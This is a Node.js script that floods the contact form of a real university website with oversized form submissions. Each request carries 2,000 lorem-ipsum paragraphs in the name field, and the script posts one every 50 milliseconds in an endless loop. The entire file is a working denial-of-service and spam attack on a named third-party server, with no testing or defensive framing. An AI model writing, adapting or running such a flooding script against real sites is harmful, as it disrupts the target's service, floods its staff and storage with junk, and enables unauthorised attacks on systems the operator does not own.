const axios = require('axios');
const { LoremIpsum } = require('lorem-ipsum');

const lorem = new LoremIpsum({
    sentencesPerParagraph: {
        max: 8,
        min: 4
    },
    wordsPerSentence: {
        max: 16,
        min: 4
    }
});

const qs = require('qs');
let data = `full_name=${lorem.generateParagraphs(2000)}&phone_number=123131321&email=dghdhg%40gmail.com&referral_classification=intl.info%40biu.ac.il&request_subject=dghdfh&referral_content=dfhdfhdgf&form_build_id=form-qr9MMam0_kGyMiHxtbxnox3DIJ8IB3Dunx0u1mmAzbU&form_id=webform_submission_general_contact_form_node_402_add_form&_triggering_element_name=op&_triggering_element_value=Submit&_drupal_ajax=1&ajax_page_state%5Btheme%5D=biu_base&ajax_page_state%5Btheme_token%5D=&ajax_page_state%5Blibraries%5D=biu_base%2Fglobal%2Cbiu_base%2Fmain-menu%2Cbiu_base%2Fsite-header%2Cbiu_contact_form%2Fcandidate-contact-form%2Ccore%2Fdrupal.dialog.ajax%2Ccore%2Fhtml5shiv%2Ccore%2Fpicturefill%2Csystem%2Fbase%2Cwebform%2Fwebform.ajax%2Cwebform%2Fwebform.element.details.save%2Cwebform%2Fwebform.element.details.toggle%2Cwebform%2Fwebform.element.message%2Cwebform%2Fwebform.element.select%2Cwebform%2Fwebform.form`;

let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'https://www.biu.ac.il/en/node/402?ajax_form=1&_wrapper_format=html&_wrapper_format=drupal_ajax',
    headers: {
        'authority': 'www.biu.ac.il',
        'accept': 'application/json, text/javascript, */*; q=0.01',
    },
    data: data
};

setInterval(() => {
    axios.request(config)
        .then((response) => {
            console.count(response.status);
        })
        .catch((error) => {
            console.log(error);
        });

}, 50)   